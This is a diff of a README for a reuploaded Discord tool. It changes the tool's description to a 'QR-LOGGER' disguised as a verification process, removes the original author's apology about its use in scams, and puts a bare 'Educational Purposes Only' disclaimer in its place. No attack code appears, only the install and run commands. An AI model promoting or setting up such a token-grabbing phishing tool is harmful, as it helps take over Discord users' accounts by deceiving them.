@@ -2,20 +2,14 @@
 <h2 align="center">ReUploaded by BLIZZ/DELU$ION</h2>
 
 <p align="center">
-  [Discord] - This Bot is a Script Gathering for Windows systems written in Python.
+  Its a QR-LOGGER for Discord hidden as a "verification proccess"
 </p>
-<h3><p align="center">
-  My work was never created to be used in a malicious way. I noticed that it was used to scam other people and I'm sorry about that.
-  I'm thinking of deleting this directory to avoid further damage.
-</p></h3>
 
 
 ## Disclaimer
-
-|Bot was made for Educational purposes|
-|-------------------------------------------------|
-This project was created only for good purposes and personal use.
-By using this Bot, you agree that you hold responsibility and accountability of any consequences caused by your actions.
+`Educational Purposes Only`<br>
+`I (LuyaTools/Blizz) dont own this tool. It fully belongs to Astraa`<br>
+`https://github.com/AstraaDev/`
 
 ## Features
 
@@ -63,15 +57,6 @@ $ python -m pip install -r requirements.txt
 $ python main.py
 ```
 
-## Additional Informations
-General Informations:
-- If you have a problem, [CLICK HERE](https://youtu.be/B5xxURQtd3A) to watch the YouTube video.
-- If you find any malfunction, contact me on Discord: Astraa#6100 or join my [Discord Server](https://dsc.gg/astraadev).
-
 
 ## Example
 ![verification_example.png](https://cdn.discordapp.com/attachments/826581697436581919/989174080332787712/unknown.png?size=4096)
-
-
-## Credits
-Many thanks to [RuslanUC](https://github.com/RuslanUC) for [RemoteAuthClient](https://github.com/RuslanUC/RemoteAuthClient) and [TurfuFrogy](https://github.com/TurfuFrogy) for developing the database part of the tool.
